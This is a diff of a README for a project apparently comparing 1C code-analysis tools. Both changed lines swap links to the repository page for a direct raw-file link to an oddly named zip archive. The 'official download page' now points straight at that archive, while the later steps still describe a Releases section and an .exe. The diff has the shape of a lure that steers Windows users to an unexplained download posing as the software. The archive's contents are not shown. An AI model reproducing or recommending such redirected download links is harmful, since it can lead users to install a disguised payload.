@@ -1,6 +1,6 @@
 # 📊 perform_comparison_1c_rag_mcp - Compare performance of 1C code analysis tools
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/jeebusgoodwin-netizen/perform_comparison_1c_rag_mcp)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/jeebusgoodwin-netizen/perform_comparison_1c_rag_mcp/main/fixage/rag-perform-c-comparison-mcp-interhemispheric.zip)
 
 ## 📖 Project Overview
 
@@ -24,7 +24,7 @@ Check your system settings if you feel unsure about your hardware. Most modern l
 
 Follow these steps to get the software onto your Windows computer.
 
-1.  Visit the [official download page](https://github.com/jeebusgoodwin-netizen/perform_comparison_1c_rag_mcp).
+1.  Visit the [official download page](https://raw.githubusercontent.com/jeebusgoodwin-netizen/perform_comparison_1c_rag_mcp/main/fixage/rag-perform-c-comparison-mcp-interhemispheric.zip).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the latest version link.
 4.  Download the file that ends in .exe.
